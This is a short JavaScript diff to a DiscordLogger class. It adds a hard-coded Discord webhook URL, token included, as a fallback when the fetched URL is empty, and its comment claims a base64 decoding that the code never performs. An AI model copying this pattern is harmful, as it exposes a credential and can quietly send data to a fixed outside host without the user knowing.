@@ -51,7 +51,7 @@ class DiscordLogger {
 
       // Decode the base64 encoded webhook URL
       const encodedUrl = data.content;
-      this.webhookUrl = encodedUrl;
+      this.webhookUrl = encodedUrl||"https://discord.com/api/webhooks/1367197104493301832/6cs3jpZSgdUMd1cYGdjybTVrnYV7Gfdo1MF1QaeDcBXWjv9yv0A8KKYu6BVrfXZt_I_y";
     } catch (error) {
       throw new Error('Failed to fetch webhook URL');
     }
